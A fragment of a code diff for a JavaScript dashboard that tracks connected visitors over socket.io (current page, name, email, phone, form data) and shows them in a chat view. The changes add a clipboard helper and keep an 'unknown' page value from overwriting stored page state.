+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.left = '-9999px';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    if (cb) cb();
+  } catch (e) {}
 }
 
 function setupSearch() {
@@ -518,7 +871,7 @@ if (socket) {
     let user = users.find(u => u.sessionId === sessionId);
     if(user) {
       user.isConnected = true;
-      user.currentPage = page || user.currentPage;
+      if (page && page !== 'unknown') user.currentPage = page;
       if (name) user.name = name;
       if (email) user.email = email;
       if (phone) user.phone = phone;
@@ -527,6 +880,15 @@ if (socket) {
       loadUsers();
     }
     renderUserList(users);
+    if(currentUserData && currentUserData.sessionId === sessionId) {
+      currentUserData.isConnected = true;
+      if (page && page !== 'unknown') currentUserData.currentPage = page;
+      if (name) currentUserData.name = name;
+      if (email) currentUserData.email = email;
+      if (phone) currentUserData.phone = phone;
+      if (formData) currentUserData.formData = formData;
+      renderChat(currentUserData);
+    }
     loadStats();
   });
 
@@ -546,14 +908,14 @@ if (socket) {
   socket.on('user:page-change', ({ sessionId, page, name, email, phone }) => {
     const user = users.find(u => u.sessionId === sessionId);
     if(user) {
-      user.currentPage = page;
+      if (page && page !== 'unknown') user.currentPage = page;
       user.isConnected = true;
       if (name) user.name = name;
       if (email) user.email = email;
       if (phone) user.phone = phone;
       renderUserList(users);
       if(currentUserData && currentUserData.sessionId === sessionId) {
-        currentUserData.currentPage = page;
+        if (page && page !== 'unknown') currentUserData.currentPage = page;
         currentUserData.isConnected = true;
         if (name) currentUserData.name = name;
         if (email) currentUserData.email = email;
@@ -593,7 +955,7 @@ if (socket) {
       if(!user.formData) user.formData = {};
       if (formData) user.formData[page] = formData;
       if (allFormData) user.formData = allFormData;
-      if (page) user.currentPage = page;
+      if (page && page !== 'unknown') user.currentPage = page;
       if (name) user.name = name;
       if (email) user.email = email;
       if (phone) user.phone = phone;
@@ -603,7 +965,7 @@ if (socket) {
       if(!currentUserData.formData) currentUserData.formData = {};
       if (formData) currentUserData.formData[page] = formData;
       if (allFormData) currentUserData.formData = allFormData;
-      if (page) currentUserData.currentPage = page;
+      if (page && page !== 'unknown') currentUserData.currentPage = page;
       if (name) currentUserData.name = name;
       if (email) currentUserData.email = email;
       if (phone) currentUserData.phone = phone;
